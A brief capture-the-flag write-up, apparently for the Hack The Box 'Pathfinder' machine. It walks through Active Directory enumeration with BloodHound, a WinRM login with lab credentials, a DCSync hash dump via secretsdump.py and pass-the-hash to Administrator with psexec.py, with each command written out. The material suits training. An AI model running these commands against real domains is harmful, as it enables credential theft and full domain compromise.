# Pathfinder - Windows machine

- Amongst other ports 88 and 389 are open which indicate that this is a domain controller. 
**WinRM is enabled on port 5985**

## Enumeration
- Credentials obtained from the last machine : sandra:Password1234!
- To get all the json files for plotting graphs
```
bloodhound-python -d megacorp.local -u sandra -p Password1234! -gc pathfinder.megacorp.local -c all -ns 10.10.10.30
```

**Observation from the graph: svc_bes has GetChangesAll privileges to the domain, which means that the account has the ability to request replication data from the domain controller, and gain sensitive information such as user hashes.**

## Initial access
- Login using the credentials obtained -> **svc_bes:Sheffield19**
`evil-winrm -i 10.10.10.30 -u svc_bes -p Sheffield19`

## Privilege Escalation 
- Using the GetChangesAll permission, we can dump all users' NTLM hashes by performing a DSync attack.
```
secretsdump.py -dc-ip 10.10.10.30 megacorp.local/svc_bes:Sheffield19@10.10.10.30
```

- Performing a Pass the hash attack using the Administrator hash
```
psexec.py megacorp.local/administrator@10.10.10.30 -hashes <hash>:<hash>
```

